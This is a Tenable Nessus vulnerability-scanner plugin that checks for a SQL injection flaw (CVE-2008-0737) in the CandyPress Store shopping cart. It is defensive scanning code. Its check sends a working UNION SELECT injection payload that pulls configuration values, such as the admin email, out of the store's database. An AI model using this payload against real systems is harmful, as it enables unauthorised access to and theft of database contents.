#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(30107);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2008-0737");
  script_bugtraq_id(27454);
  script_osvdb_id(40701);
  script_xref(name:"EDB-ID", value:"4988");
  script_xref(name:"Secunia", value:"28662");

  script_name(english:"CandyPress Store admin/utilities_ConfigHelp.asp helpfield Parameter SQL Injection");
  script_summary(english:"Tries to extract configuration data from database");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP script that is susceptible to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running CandyPress, a commercial shopping cart
script written in ASP. 

The version of CandyPress installed on the remote host fails to
sanitize user-supplied input to the 'helpfield' parameter of the
'admin/utilities_ConfigHelp.asp' script before using it to perform
database queries.  An unauthenticated attacker may be able to exploit
this issue to manipulate database queries to disclose sensitive
information, bypass authentication, or even attack the underlying
database. 

Note that this version may also be affected by several other SQL
injection, cross-site scripting, and information disclosure
vulnerabilities, although Nessus did not explicitly check for them." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Jan/368" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to CandyPress version 4.1.1.27 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/01/28");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:shoppingtree:candypress_store");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ASP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_asp(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/candypress", "/store", "/shop", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to pull some config info out of CandyPress' database.
  if (thorough_tests) configvars = make_list("pEmailAdmin", "storeVersion");
  else configvars = make_list("storeVersion");

  info = "";
  foreach configvar (configvars)
  {
    exploit = string("-1') union select configVal as configHelp from storeAdmin where configVar='", configvar, "' or ('1'='2");

    r = http_send_recv3(method:"GET", port: port,
      item:string(dir, "/admin/utilities_ConfigHelp.asp?",
        "helpfield=", str_replace(find:" ", replace:"%20", string:exploit) ) );
    if (isnull(r)) exit(0);
    res = r[2];

    if (
      "Store Configuration - Help" >< res &&
      "DESCRIPTION:" >< res
    )
    {
      configval = strstr(res, "DESCRIPTION:");
      configval = strstr(configval, '\r\n') - '\r\n';
      if (configval) configval = configval - strstr(configval, "<br>");
      if (configval) info += '  ' + configvar + ' : ' + configval + '\n';
    }
  }

  if (info)
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus extracted the following information about the configuration\n",
        "of CandyPress on the remote host :\n",
        "\n",
        info
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);

    exit(0);
  }
}
